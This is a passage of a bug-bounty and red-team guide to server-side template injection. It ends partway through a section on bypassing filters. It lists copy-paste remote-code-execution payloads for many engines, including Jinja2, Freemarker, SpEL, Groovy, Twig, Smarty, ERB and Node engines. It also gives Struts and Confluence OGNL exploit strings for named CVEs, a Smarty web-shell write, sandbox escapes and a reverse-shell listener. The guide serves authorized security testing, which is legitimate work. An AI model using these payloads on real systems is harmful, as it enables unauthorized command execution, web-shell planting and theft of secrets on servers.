# Server-Side Template Injection (SSTI) — Complete In-Depth Testing Guide (Expert / Bug-Bounty & Red-Team Edition)

**Author:** x8bitranjit
**Scope:** Any feature where user input is embedded into a **server-side template that is then rendered** — email/notification templates, "customize your page/invoice", name/profile fields rendered back, CMS/page builders, report/PDF generators, marketing/templating engines, subject lines, error pages, any `render_template_string`-style sink
**Platforms:** Python/Java/PHP/Ruby/Node engines covered; Kali/WSL for tooling
**Companion files in this folder:**
- `SSTI_ARSENAL.md` — engine-detection probes + per-engine RCE payloads + sandbox-escape strings (copy-paste)
- `SSTI_CHECKLIST.md` — the testing-order checklist you tick per sink
- `SSTI_REPORT_TEMPLATE.md` — the report skeleton that gets paid
- `poc/` — runnable tooling (SSTI detector with differential FP-gating, engine fingerprinter, RCE payload builder)

> **Companion to the Command-Injection · XSS · LFI · SSRF guides** (SSTI's real chains — OS-exec, CSTI-vs-XSS, sandboxed file-read, engine-fetch→metadata). SSTI is a **top-tier RCE class**: when user input is evaluated as a template expression, you go from "my name renders" to "**`{{...}}` runs `id` on the server.**" The two mistakes hunters make: (1) reporting **`{{7*7}}=49`** without proving it's *server-side evaluation* (it can be a coincidence, a client-side framework, or plain reflection) — that gets closed; and (2) stopping at `49` instead of identifying the **engine** and walking the object chain to **RCE**. Read §4 (confirm + differentiate) and Part III (engine → RCE) before you celebrate a `49`.

---

> ### ⚡ READ THIS FIRST — why most SSTI reports underpay (or get closed)
> 1. **`{{7*7}}=49` is a *lead*, not a finding — and often a false positive.** `49` can appear by coincidence, from a **client-side** framework (AngularJS/Vue = *client*-side template injection → XSS, not server RCE), or from harmless reflection. **Differentiate**: `{{7*7}}`→`49` AND `{{7*'7'}}`→`7777777` (string-multiply) proves a real **server template engine** evaluated it (§4). Use distinct, non-round operands so `49`/`343` can't be a coincidence.
> 2. **Identify the engine, then go to RCE.** The payload that pops a shell is **engine-specific** (Jinja2 ≠ Twig ≠ Freemarker ≠ Velocity ≠ ERB ≠ Smarty ≠ Handlebars). Fingerprint first (§5), then use that engine's object-traversal/RCE chain (§9–§14).
> 3. **SSTI's ceiling is RCE.** Most server-side engines reach the OS (`os.popen`, `Runtime.exec`, `system`). Even "sandboxed" engines (Jinja2 sandbox, Twig sandbox) have **known escapes**. Always push for RCE; if truly sandboxed, fall back to file read / SSRF / config/secret disclosure (still High) (§15).
> 4. **CSTI ≠ SSTI.** If the evaluation happens in the **browser** (the framework is Angular/Vue/etc.), it's *client-side* template injection → **XSS** (go to the XSS kit). SSTI is **server-side** — the math/code runs on the server (the response is computed server-side, no JS needed). Tell them apart (§4/§16).
> 5. **Blind SSTI is real.** The template may render where you can't see it (a queued email, a PDF, an admin view). Use **time** (`{{... sleep ...}}`) and **OOB** (make the engine fetch your host) to confirm, then exfil (§13).
>
> **Where the money is (memorize this order):** ① **engine identified → RCE/shell (full server compromise) — Critical** → ② **sandboxed engine escaped → RCE — Critical** → ③ **file read / SSRF / config-secret disclosure via the template — High** → ④ **blind SSTI confirmed via time/OOB → RCE — Critical** → ⑤ *then* an unverified `{{7*7}}=49` or a client-side `{{}}` as a **lead**, not a headline.

---

## Table of Contents

**▶ [Master Testing Sequence — the testing order](#master-testing-sequence--the-testing-order)**

**PART I — FOUNDATIONS, RECON & BASELINE**
1. [Environment & Tooling Setup](#1-environment--tooling-setup)
2. [SSTI Anatomy — How Template Injection Becomes RCE](#2-ssti-anatomy)
3. [Reconnaissance — Find Every Template Sink](#3-reconnaissance--find-every-template-sink)
4. [Baseline — Confirm *Server-Side* Evaluation (kill the false positives)](#4-baseline--confirm-server-side-evaluation)

**PART II — FINGERPRINT THE ENGINE (work in this order)**
5. [Engine Fingerprinting — the Decision Tree](#5-engine-fingerprinting--the-decision-tree)
6. [Reading the Template Context & Sandbox State](#6-reading-the-template-context--sandbox-state)

**PART III — EXPLOITATION BY IMPACT (engine → RCE)**
7. [Python — Jinja2 / Django / Mako / Tornado → RCE](#7-python-engines--rce)
8. [Java — Freemarker / Velocity / Thymeleaf → RCE](#8-java-engines--rce)
9. [PHP — Twig / Smarty / Blade → RCE](#9-php-engines--rce)
10. [Ruby — ERB / Slim, Node — Handlebars / Pug / EJS / Nunjucks → RCE](#10-ruby--node-engines--rce)
11. [Sandbox Escapes (Jinja2 / Twig sandbox)](#11-sandbox-escapes)
12. [SSTI → Shell, File Read, SSRF & Secret Disclosure](#12-ssti--shell-file-read-ssrf--secret-disclosure)
13. [Blind SSTI — Time & OOB Confirmation](#13-blind-ssti--time--oob-confirmation)

**PART IV — VALIDITY, SEVERITY & REPORTING (the bug-bounty layer)**
14. [The Validity-First Mindset](#14-the-validity-first-mindset)
15. [False Positives — STOP reporting these](#15-false-positives--stop-reporting-these-auto-reject-list)
16. [Severity Calibration](#16-severity-calibration--how-triagers-really-rate-ssti)
17. [Impact-Escalation Playbooks — "you found X, now do Y"](#17-impact-escalation-playbooks--you-found-x-now-do-y)
18. [Building a Professional, Safe PoC](#18-building-a-professional-safe-poc)
19. [Reporting, CWE/CVSS & De-duplication](#19-reporting-cwecvss--de-duplication)
20. [Automation & Red-Team Notes](#20-automation--red-team-notes)
21. [Real-World Case Studies (Verified)](#21-real-world-case-studies-verified)

**Appendices**
- [Appendix A — SSTI Workflow Cheat Sheet](#appendix-a--ssti-workflow-cheat-sheet)
- [Appendix B — SSTI Decision Tree](#appendix-b--ssti-decision-tree)
- [Appendix C — Important Links](#appendix-c--important-links)
- [Appendix D — Worked End-to-End Transcript (`{{7*7}}` → RCE)](#appendix-d--worked-end-to-end-transcript-77--rce)

---

# Master Testing Sequence — The Testing Order

> **This is the spine.** Work top-to-bottom. Numbered sections (1–20) are reference detail; this is the order you execute.

```
PHASE 0  RECON            → find every place user input is RENDERED by a server template (§3) + OOB host (§1)
PHASE 1  BASELINE  ★      → confirm SERVER-SIDE eval with a DIFFERENTIAL probe (7*7 AND 7*'7'); reject FPs (§4)
PHASE 2  FINGERPRINT      → identify the engine via the decision tree (§5); read context + sandbox state (§6)
PHASE 3  IMPACT  ⭐ (money)→ engine-specific RCE:
                            Python (§7) · Java (§8) · PHP (§9) · Ruby/Node (§10) · sandbox escape (§11) →
                            shell/file-read/SSRF/secrets (§12) · blind via time/OOB (§13)
PHASE 4  VALIDATE→REPORT  → validity (§14) · false-positive filter (§15) · severity+CVSS+CWE-1336/94 (§16) ·
                            SAFE PoC: benign marker (§18) · dedup (§19) · report template
```

**Phase-by-phase, with the deliverable before moving on:**

1. **PHASE 0 — Recon.** Find every sink where input is rendered by a **server-side** template (§3). Stand up an OOB host for blind cases (§1). *Deliverable:* a list of template sinks.
2. **PHASE 1 — Baseline ⭐.** Confirm with a **differential** probe (`{{7*7}}`→49 *and* `{{7*'7'}}`→7777777, with non-round operands) that a **server** engine evaluates your input — and reject reflection/coincidence/client-side FPs (§4). *Deliverable:* confirmed server-side template evaluation.
3. **PHASE 2 — Fingerprint.** Identify the exact engine via the decision-tree probes (§5); read the rendering context and whether a sandbox is in play (§6). *Deliverable:* the engine name + context.
4. **PHASE 3 — Impact ⭐.** Use that engine's object-traversal/RCE chain (§7–§10), escape any sandbox (§11), and reach a shell / file read / SSRF / secrets (§12); confirm blind cases via time/OOB (§13). *Deliverable:* demonstrated RCE (benign marker) or High-impact disclosure.
5. **PHASE 4 — Validate → report.** Apply validity & FP filters (§14/§15), set CVSS/CWE (§16), build a *safe* PoC (§18), de-dup, write it (§19). *Deliverable:* the submitted report.

Reference anytime: payloads → `SSTI_ARSENAL.md`; checklist → `SSTI_CHECKLIST.md`; scripts → `poc/`; playbooks **§17**.

---

# PART I — FOUNDATIONS, RECON & BASELINE

# 1. Environment & Tooling Setup

| Tool | Job |
|------|-----|
| **Burp Suite** (Repeater/Intruder) | tamper the input; replay; read the rendered output; the core tool |
| **`poc/ssti_detect.py`** | differential probe (7*7 vs 7*'7') with FP-gating + engine fingerprint |
| **`poc/ssti_rce.py`** | print the engine-specific RCE payload for a given engine + command |
| **tplmap / SSTImap** | automated SSTI detection + exploitation across engines (verify by hand) |
| **interactsh / Burp Collaborator** | OOB for blind SSTI confirmation + exfil |
| **the engines' docs / PayloadsAllTheThings** | per-engine object chains + sandbox escapes |
| **a listener** (`nc -lvnp 4444`) | catch a reverse shell (authorized engagements) |

```bash
# Kali/WSL
python3 poc/ssti_detect.py -u "https://target/profile?name=FUZZ"      # differential, low-FP
python3 poc/ssti_rce.py --engine jinja2 --cmd id                        # prints the RCE payload
python3 SSTImap/SSTImap.py -u "https://target/profile?name=test"        # automated (verify manually)
```
> **Windows:** drive Burp on Windows; run the Python `poc/` helpers, tplmap/SSTImap, and listeners in **WSL**.

---

# 2. SSTI Anatomy

## 2.1 What it is
> 🔰 **In plain words — the anchor for this whole kit.** A template engine is a **mail-merge / form-letter machine**: it holds a letter with blanks (`Dear ___, your invoice is ___`) and drops your data into the blanks. Normally *your input is only the filling* (data) — the machine prints it and moves on. **SSTI is when your input stops being the filling and becomes part of the letter's *instructions*.** And a template's instructions aren't just text — they can do math, read the program's objects, and (on most server engines) **run operating-system commands**. So when you type `{{7*7}}` into your "name" and the page answers `49`, the machine didn't print your text — it **obeyed** it. That's the whole game: your goal is to prove the machine is *executing* what you write, figure out *which* machine it is, and walk from `49` up to running `id` on the server. `{{7*7}}=49` is the doorbell; **RCE is the house.**

A template engine turns a template + data into output. If **user input becomes part of the template** (not just the data), the engine **evaluates** your input as a template expression. Expressions can read objects, call methods, and — in most server engines — reach the OS → **RCE**.
```python
# vulnerable: user input concatenated INTO the template string
render_template_string("Hello " + request.args['name'])   # name={{7*7}} → "Hello 49"
# safe: input passed as DATA
render_template_string("Hello {{ name }}", name=request.args['name'])  # name={{7*7}} → "Hello {{7*7}}" (literal)
```

## 2.2 SSTI vs CSTI vs XSS vs plain reflection (know which you have)
> **In plain words:** four different things can make `{{7*7}}` turn into `49`, and only ONE of them pays like a Critical. Ask *who* did the math and *where*. If the **server** did it (the `49` is already in the raw response before any JavaScript runs) → that's SSTI, ceiling is RCE, **this kit**. If the **browser** did it (the raw `{{7*7}}` arrived and JavaScript turned it into `49`) → that's a client-side framework like Angular/Vue → it's really XSS → **XSS kit**. If your text is just echoed into the page and runs as script → plain XSS. If `{{7*7}}` comes back *literally* as `7*7` → nobody evaluated it → nothing. Getting this wrong is the #1 way SSTI reports get closed, so settle it before you celebrate.
```
SSTI  → SERVER template evaluates your expression (math runs server-side, no JS). → RCE.  (this kit)
CSTI  → CLIENT framework (Angular/Vue) evaluates {{}} in the browser.             → XSS.   (XSS kit)
XSS   → your input is reflected into HTML/JS and runs in the browser.             → XSS.   (XSS kit)
Reflection → input echoed but NOT evaluated (7*7 stays "7*7").                    → nothing.
```

## 2.3 Where SSTI sinks live
> **In plain words:** SSTI lives wherever the app lets *you* supply text that it later *formats into something* — and the richest spots are the ones that scream "template": any feature that says "use `{{variables}}` in your email/invoice/notification" is a template engine wearing a name tag. But it also hides in humble places: a profile name echoed back, an email subject line, a support-ticket field a staff member views later. The last kind is the sleeper — your text renders *out of your sight* (in an email, a PDF, an admin panel), which is **blind SSTI** (§13).
```
□ "Customize" features:   email/notification templates, invoice/report/PDF templates, page/site builders, themes.
□ Reflected fields:       name/username/profile/bio rendered back; subject lines; error messages that template input.
□ Server-rendered output: anything where YOUR text comes back processed (markdown+template, "preview", greeting).
□ Less obvious:           filename/title used in a generated doc; config values rendered; webhook/template editors.
□ Sinks (grep src/JS):    render_template_string / Template(...).render (Jinja/Django) · new Template (Twig/Freemarker)
                          · ERB.new / Liquid (Ruby) · Handlebars.compile / pug.render / ejs.render / nunjucks (Node)
□ Indirect:               a stored value rendered later in an admin/email/PDF template → second-order/blind SSTI.
```

## 2.4 Why it pays
- **Direct RCE** on most server engines — full server compromise from a "name" field.
- **Reaches secrets** even when sandboxed — `{{config}}`, app objects, environment → creds → pivot.
- **Hits high-trust tiers** — email/PDF/report renderers often run in back-office workers with broad access.

> **The mental model:** SSTI means **the server is `eval()`-ing your text as template code.** Severity is Critical when you reach the OS; your craft is *proving it's server-side*, *fingerprinting the engine*, and *walking the object graph to a shell*.

---

# 3. Reconnaissance — Find Every Template Sink

```
□ Reflected input:   anywhere your text comes back — test each with the differential probe (§4).
□ Customizable templates:  email/notification/invoice/report editors, "use {{variables}} in your message".
□ Generated docs:    PDF/CSV/report builders that embed your fields (often a different, blind engine).
□ Markdown/preview:  "preview" features that server-render your content.
□ Headers/subjects:  email subject, display name, support-ticket fields rendered into staff/email templates (blind).
□ Source/JS recon:   grep for render_template_string / Template().render / Handlebars.compile / ERB.new with user input.
□ Stack hints:       Set-Cookie/Server headers, error pages reveal Python/Java/PHP/Ruby/Node → narrows the engine list.
```
> **If this → then that:** an app lets users author **templates** (email/notification/invoice with `{{placeholders}}`) → it's almost certainly a server template engine; test RCE expressions directly (§7–§10). A plain reflected **name** field → run the differential probe first (§4) to see if it's evaluated at all.

---

# 4. Baseline — Confirm *Server-Side* Evaluation

**This is the make-or-break step.** Prove a **server** engine evaluated your input — and kill the false positives.

> **In plain words:** before anything else, prove the *server* actually did the math — because `49` is a liar. It can be a coincidence (the page already had "49" or "7" somewhere), it can be the browser's JavaScript (CSTI, not yours to claim as RCE), or it can be plain reflection. The trick is to ask a question the page *cannot* answer by accident: `{{1337*1338}}`. If `1788906` comes back, the page couldn't have had that number lying around — a real engine computed it. Pair it with `{{7*'7'}}` (a string times a number), because a genuine engine does something *weird but consistent* with that (Jinja/Twig print `7777777`), which reflection never would. Two odd answers that both make engine-sense = confirmed. One round number = keep probing.

## 4.1 The differential probe (low false-positive)
Don't trust a lone `{{7*7}}=49`. Use **two** linked probes with **non-round** operands so a coincidence is implausible:
```
Probe A (numeric):  {{1337*1338}}     → 1788906   (engine did arithmetic)
Probe B (string):   {{7*'7'}}         → 7777777   (JINJA2 only — Python string-repeat)  OR  49 (Twig/PHP & numeric engines)  OR error
Confirm: BOTH behave like an engine (A computes the product; B either string-multiplies or computes) AND the literal
         text "{{1337*1338}}" does NOT appear → it's SSTI.
```
Multi-syntax polyglot (fires across engines), then narrow:
```
${{<%[%'"}}%\        ← classic detection polyglot; an error or partial-eval flags a template engine
{{7*7}}  ${7*7}  #{7*7}  <%= 7*7 %>  {7*7}  ${{7*7}}  @(7*7)    ← try each; which one renders 49 tells you the family
```

## 4.2 Rule out the false positives (critical)
```
□ Is it CLIENT-side? View source: does the RAW "{{7*7}}" arrive at the browser and only become 49 after JS runs?
   → that's Angular/Vue CSTI → XSS kit, not SSTI. (SSTI computes 49 in the SERVER response, before any JS.)
□ Is it coincidence? "49"/"7" could be pre-existing page content. Use 1337*1338=1788906 — a value the page can't already contain.
□ Is it just reflection? {{7*7}} comes back literally "7*7"/"{{7*7}}" → NOT evaluated → no SSTI.
□ Is it an error only? A template error (stack trace) without evaluation may still indicate a sink — keep probing.
```

## 4.3 Note what you'll need next
- **Which delimiter** evaluated (`{{ }}` vs `${ }` vs `<%= %>` vs `{ }`) → narrows the engine (§5).
- **String-multiply behavior** (`7*'7'`→`7777777`) → **Jinja2** (Python string-repeat is Jinja-only); `7*'7'`→`49` → Twig (PHP) or another numeric engine; error → others.
- **Stack** (headers/errors) → Python/Java/PHP/Ruby/Node → which RCE chain.

> **Don't report `{{7*7}}=49`.** By itself it's the #1 SSTI false positive. The finding starts at **"a server engine evaluated `1337*1338` to `1788906` and it's engine `X`."** Differentiate, fingerprint, then go to RCE.

---

# PART II — FINGERPRINT THE ENGINE (work in this order)

> Full probe/payload sets are in `SSTI_ARSENAL.md`.

# 5. Engine Fingerprinting — the Decision Tree

> **In plain words:** you've proven *a* machine is executing your text — now find out *which* machine, because every engine speaks a different dialect and the payload that pops a shell in Jinja2 just errors out in Twig or Freemarker. Think of it as identifying an accent: send a few phrases and listen to how each one comes back. Does `{{7*'7'}}` give `7777777`? (Jinja2 or Twig.) Does `${7*7}` work instead of `{{ }}`? (a Java engine.) Does `<%= 7*7 %>`? (Ruby ERB or Node EJS.) You're narrowing "some template engine" down to one exact name **before** you spend your attempts on RCE payloads.

Send these and branch on what renders:
```
{{7*7}} → 49 ?
  ├─ {{7*'7'}} → 7777777 ?  → JINJA2 (Python). String-repeat (`int*str`) is PYTHON-ONLY, so 7777777 ≈ confirms Jinja2.
  │     Confirm: {{config}} or {{self}} renders app config → JINJA2 locked.
  └─ {{7*'7'}} → 49 (numeric) → TWIG (PHP) or another numeric engine (Twig runs on PHP → 7*'7'=49, NOT 7777777).
        Confirm TWIG: {{_self}} / {{ '%07'|... }} / Twig-specific filters render.
${7*7} → 49 ?
  ├─ ${"z".join("ab")}-style / ${T(java...)} → JAVA SpEL / Thymeleaf.
  ├─ #{7*7} → 49 → Ruby (Slim) / Thymeleaf (#{}) → check.
  └─ <#assign ...> works → FREEMARKER (Java).
#{7*7} → 49 ?  → Ruby (Slim/ERB-ish) or Thymeleaf.
<%= 7*7 %> → 49 ? → ERB (Ruby) or EJS (Node).
{7*7} → 49 ? → SMARTY (PHP) or Tornado-ish.
{{=7*7}} / a7a → tornado/handlebars idioms.
No {{}}/${} but {%...%} errors → Jinja/Twig statement context.
```
Use `poc/ssti_detect.py` which automates this branch and prints the most likely engine + confidence.

> **If this → then that:** `{{7*'7'}}`=`7777777` → **Jinja2** (Python string-repeat is Jinja-only; `{{config}}` then locks it). `{{7*7}}`=`49` but `{{7*'7'}}`=`49` → **Twig** (PHP) — confirm with `{{_self}}`/Twig filters. `${...}` with Java-ish behavior = **Freemarker/Velocity/SpEL**. `<%= %>` = **ERB/EJS**. Nail the engine *before* firing RCE payloads — the wrong engine's payload just errors and wastes your attempts.

---

# 6. Reading the Template Context & Sandbox State

```
□ Output context:  is your expression in text, an HTML attribute, or already inside template tags? Adjust delimiters.
□ Statement vs expression:  some engines need {% ... %} (Jinja) / <# ... > (Freemarker) for control flow, {{ }} for output.
□ Sandbox?:  {{config}} blocked, __class__ blocked, or "SecurityError"/"sandbox" in errors → a sandbox is active → §11.
□ Available objects:  dump what's in scope — {{self}}, {{config}}, {{ dir() }}-equivalents — to find a path to os/Runtime.
□ Length/char limits:  some sinks truncate or filter . / _ / [ ] — plan the shortest engine-specific chain & encodings.
```
> **If this → then that:** `{{config}}`/`__class__` are blocked or throw a sandbox error → you're in a **sandboxed** engine (Jinja2/Twig sandbox) → use a known **escape** (§11) before the RCE chain. If objects render freely, go straight to the engine's RCE payload (§7–§10).

---

# PART III — EXPLOITATION BY IMPACT (engine → RCE)

> Every PoC uses a **benign marker** (`id`/unique echo) on your **authorized** target; reverse shells only on explicitly authorized engagements; clean up (§18). Full per-engine strings in `SSTI_ARSENAL.md`.

# 7. Python Engines → RCE

> **In plain words:** here's the payoff — turning "the engine runs my text" into "the engine runs my *shell commands*." Jinja2 (Python's most common engine, used by Flask) doesn't hand you `os.system` directly, so you climb an **object staircase**: start from an object the template gives you for free (`cycler`, `lipsum`, `request`), hop through its hidden Python attributes (`.__globals__`) until you reach the `os` module, then call `.popen('id')`. It looks like gibberish, but it's just "from *this* object, find a door to the operating system." Paste one of the lines below; if `id` comes back (your user + groups), you have full RCE. If they're blocked, `{{config}}` alone often leaks Flask's `SECRET_KEY` — enough to forge admin login cookies (still High–Critical).

## 7.1 Jinja2 (Flask) — the classic
```
Confirm:  {{7*7}}=49 , {{7*'7'}}=7777777 , {{config}} dumps app config (often SECRET_KEY → forge sessions).
RCE (pick one that the version/sandbox allows):
  {{ cycler.__init__.__globals__.os.popen('id').read() }}
  {{ lipsum.__globals__.os.popen('id').read() }}
  {{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
  {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
  {{ ''.__class__.__mro__[1].__subclasses__() }}   → find subprocess.Popen index → call it (classic MRO walk)
Config/secret (even if RCE blocked):  {{ config }}  ·  {{ config['SECRET_KEY'] }}  → forge/decrypt sessions.
```

## 7.2 Django templates
Django's template language is intentionally limited (no arbitrary Python) → usually **no direct RCE**, but:
```
{{ settings.SECRET_KEY }}  (if settings exposed)  ·  template-tag abuse  ·  often info-disclosure, not RCE.
```

## 7.3 Mako / Tornado
```
Mako:    ${self.module.cache.util.os.system('id')}   or  <% import os %>${os.popen('id').read()}
Tornado: {% import os %}{{ os.popen('id').read() }}
```
> **If this → then that:** Jinja2 confirmed → try `cycler`/`lipsum`/`request.application` globals first (short, reliable). Sandbox/old version blocks them → MRO subclass walk or a known sandbox escape (§11). Even with no RCE, **`{{config}}` → `SECRET_KEY`** lets you forge Flask sessions (often High–Critical on its own).

---

# 8. Java Engines → RCE

## 8.1 Freemarker
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
${"freemarker.template.utility.Execute"?new()("id")}
# also: ObjectConstructor / api.* in some configs.
```

## 8.2 Velocity
```
#set($e="exec")
$e... → reach java.lang.Runtime:
#set($x=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))  (Velocity-tools context)
```

## 8.3 Spring SpEL / Thymeleaf
```
${T(java.lang.Runtime).getRuntime().exec("id")}
*{T(java.lang.Runtime).getRuntime().exec("id")}
__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x   (Thymeleaf expression preprocessing)
```
> **If this → then that:** `${...}` Java context → Freemarker `?new()` Execute is the most reliable; Spring/Thymeleaf → `T(java.lang.Runtime).getRuntime().exec(...)`. Read command output by wrapping with `.getInputStream()` reads where the engine supports it, or use OOB/time if output isn't returned (§13).

## 8.4 Expression-Language injection (OGNL / MVEL / Java EL) — the biggest real-world Java RCEs
SSTI's close cousin: many Java frameworks evaluate **expression languages** in template/parameter contexts. Same mindset (your expression runs server-side → RCE), different syntax — and these are the **mass-exploited** CVEs.
```
OGNL (Struts 2 / Confluence / older Spring) — the classic Java RCE expression language:
  Struts2 (CVE-2017-5638, Content-Type/multipart OGNL):
    %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).
      (#ognlUtil=#context['com.opensymphony.xwork2.ActionContext.container'].getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).
      ...@java.lang.Runtime@getRuntime().exec('id')...}        (published PoC — match the Struts version)
  Confluence OGNL (CVE-2021-26084, unauth): inject into the `queryString`/page params:
    '%2b#{...@java.lang.Runtime@getRuntime().exec("id")}%2b'
  Confluence (CVE-2022-26134, unauth OGNL in the URL path):
    /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28...exec%28%22id%22%29...%29%29%7D/
MVEL (some Java rule/template engines):  Runtime.getRuntime().exec('id')  via the MVEL context.
Java EL / JSF (${ } / #{ } in JSP/Facelets):
  ${''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(...,'id')}
  ${facesContext.getExternalContext().getRequest()...}        (EL → reflection → exec)
```
> **If this → then that:** the target is **Struts 2 / Confluence / a Java app reflecting `${}`/`%{}`/`#{}`** → you're likely facing **OGNL/EL injection**, not just a template engine. Fingerprint the product + version and use the matching **published CVE PoC** (Struts CVE-2017-5638, Confluence CVE-2021-26084 / CVE-2022-26134) — these are **unauthenticated RCE** Criticals. Prove with a benign `id`/OOB and stop.

## 8.5 Groovy templates (SimpleTemplateEngine / GStringTemplateEngine / StreamingTemplateEngine) → RCE
Groovy's template engines evaluate `${...}` and `<% %>` as **full Groovy** — and Groovy is a JVM scripting language with direct OS access. Found in **Jenkins** (script consoles / job DSL / pipeline), Spring apps using `GroovyMarkupTemplateEngine`, and any app that renders a user-supplied Groovy template. This is a top-tier RCE primitive (the Jenkins/Groovy sandbox-escape lineage is a long CVE trail).
```
Confirm:  ${7*7} → 49   ·   <%= 7*7 %> → 49   (Groovy GString / scriptlet eval)
RCE (Groovy has Runtime/ProcessBuilder natively):
  ${"id".execute().text}                                  ← the idiomatic Groovy one-liner (String.execute())
  ${["id"].execute().text}
  ${"id".execute().getText()}
  ${Runtime.getRuntime().exec("id").text}
  <% out.print("id".execute().text) %>                    ← scriptlet form
  ${new ProcessBuilder(["bash","-c","id"]).redirectErrorStream(true).start().text}   ← shell for pipes
Sandbox (Jenkins script-security / Groovy sandbox):
  → use a published sandbox-escape gadget (meta-programming / @ASTTest / map-constructor coercion);
    these are the Jenkins/Groovy-sandbox CVE chain — match the version.
```
> **If this → then that:** `${...}`/`<% %>` evaluates in a **Java/JVM** app and `${"id".execute().text}` returns output → **Groovy template injection → RCE** (Critical). If a **Groovy sandbox** blocks it (Jenkins script-security), reach for a version-matched **sandbox-escape gadget** — escaped Groovy sandbox is still RCE. Groovy's `String.execute()` is the fastest proof; `ProcessBuilder` when you need a real shell.

---

# 9. PHP Engines → RCE

## 9.1 Twig
```
Confirm: {{7*7}}=49 , {{7*'7'}}=49 (Twig runs on PHP → numeric coercion, NOT Jinja's 7777777) , {{_self}} / Twig filters render.
RCE (modern Twig):
  {{ ['id']|filter('system') }}
  {{ ['id',''] | sort('system') }}
  {{ _self.env.registerUndefinedFilterCallback('exec') }}{{ _self.env.getFilter('id') }}   (older Twig)
  {{ attribute(_self.env, 'getFilter', ['system'])('id') }}
```

## 9.2 Smarty
```
{system('id')}
{php}system('id');{/php}     (older Smarty)
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system($_GET['c']); ?>",self::clearConfig())}  (web-shell write)
```

## 9.3 Blade (Laravel)
```
Blade compiles to PHP; raw {!! !!} of user input or @php blocks can reach RCE; often the sink is an eval of user Blade.
{{ system('id') }} only if raw/eval context. Look for Blade::render($userInput) sinks.
```
> **If this → then that:** Twig confirmed → `{{ ['id']|filter('system') }}` is the cleanest modern RCE; older Twig → the `registerUndefinedFilterCallback('exec')` two-step. Smarty → `{system('id')}` directly. These reach the OS the same way command injection does — read §11–§12 of the **Command-Injection kit** for shell/exfil discipline.

---

# 10. Ruby & Node Engines → RCE

```
ERB (Ruby):        <%= `id` %>   <%= system('id') %>   <%= IO.popen('id').read %>
Slim (Ruby):       #{`id`}       (interpolation)
Erubi/Erubis:      similar to ERB.
Handlebars (Node): a prototype-chain payload reaching require('child_process').execSync('id') (multi-step; see arsenal).
Pug/Jade (Node):   #{root.process.mainModule.require('child_process').execSync('id')}
                   = global.process.mainModule.require('child_process').execSync('id')
EJS (Node):        <%= global.process.mainModule.require('child_process').execSync('id') %>
                   (or the `outputFunctionName`/`escapeFunction` option-injection RCE)
Nunjucks (Node):   {{ range.constructor("return global.process.mainModule.require('child_process').execSync('id')")() }}
```

### 10.1 Other Node engines (often missed — each has a known RCE)
Less-common Node template engines that are still shipped in "custom email/page/notification template" features — and each has a documented RCE (several have CVEs):
```
doT (Node):        {{= global.process.mainModule.require('child_process').execSync('id') }}
                   doT compiles templates to JS with `new Function` → direct code execution.
Eta (Node):        <%= it.constructor.constructor('return process')().mainModule.require('child_process').execSync('id') %>
                   (Eta is the modern EJS successor; same `new Function` compile → RCE; CVE-class.)
Squirrelly (Node): {{ "" | something }} → option/helper injection RCE (CVE-2021-... / 2023 RCE advisories);
                   abuse the `autoEscape`/filter/helper config the same way as EJS option-injection.
Hogan.js / Mustache-strict: logic-less by design → usually NOT RCE (info-leak/HTML-injection only) → treat as XSS/CSTI lead.
Dust.js (LinkedIn): logic-less-ish → context-disclosure ({@if}/helpers may leak); RCE rare → file the data exposure.
Velocity-on-Node / Marko: Marko compiles to JS → `constructor.constructor('return process')()...execSync('id')` chain.
```
> **If this → then that:** the app names a **less-common Node engine** (doT / Eta / Squirrelly / Marko) and `${}`/`<%= %>`/`{{= }}` evaluates → the RCE path is the **`new Function` / `constructor.constructor('return process')()`** gadget reaching `child_process` — these compile templates to JS, so code runs. For **logic-less** engines (Hogan/Mustache/Dust) there's usually **no RCE** → downgrade to **context/data disclosure or HTML-injection (XSS)**, don't over-claim RCE.

> **If this → then that:** Node engine → the path to RCE is almost always `process.mainModule.require('child_process').execSync('id')` reached through the engine's available globals (`root`/`global`/`range.constructor`/`constructor.constructor`). ERB → backticks/`system` directly. Pick the engine's idiom from the fingerprint (§5).

---

# 11. Sandbox Escapes

> **In plain words:** a *sandbox* is the engine's own bouncer — it tries to block the dangerous doors (`__class__`, `config`, `os`) so template authors can't reach the OS. But bouncers miss exits. The escape is to reach the same runtime through a door the bouncer *forgot* — a different built-in object (`cycler`/`namespace`), attribute-access spelled a different way (`|attr('__class__')` instead of `.__class__`), or the blocked word *smuggled in* through a URL parameter so it never appears in your template text. Treat "it's sandboxed" as a speed bump, not a wall: an escaped sandbox is **still Critical RCE**, and even a truly locked one usually still leaks file contents and secrets (§12).

Some engines ship a **sandbox** that blocks dangerous attributes. Known escapes exist:
```
Jinja2 sandbox:   reach builtins via objects the sandbox forgot to block — e.g. via {{ cycler }}/{{ joiner }}/{{ namespace }}
                  globals, or attribute-by-getattr tricks; |attr('__class__'); request.__class__ chains.
                  Many CTF/real escapes use request.application.__globals__ or get_flashed_messages.__globals__.
Twig sandbox:     filter/function allowlist bypass via map/filter/sort('system') (the same RCE filters above often slip
                  the sandbox in older versions); attribute() to reach env methods.
Generic:          if . is blocked → use [ 'attr' ] indexing or |attr() ; if _ blocked → use \x5f / unicode / request args.
                  if a word is filtered → build it via concatenation/format inside the template.
```
> **If this → then that:** `{{config}}`/`__class__` blocked but the engine is Jinja2 → try the **globals via `cycler`/`joiner`/`namespace`** or `request.application.__globals__` paths (these frequently survive the sandbox). Char filters (`.`/`_`) → `|attr()` and `['...']` indexing. A "sandboxed" engine is usually **escapable** → still Critical.

## 11.1 Filter / WAF bypass — when `{{`, `.`, `_`, `[`, or keywords are blocked
A WAF or an app-level filter (not the engine's sandbox) blocks the obvious tokens. Route around the specific block:
```
DELIMITER blocked ({{ }}):   use the STATEMENT context {% ... %} (Jinja: {%print(...)%}) ; Twig {% ... %} ;
                             ${ } / #{ } / <%= %> per engine ; Jinja {%if ...%} for blind boolean.
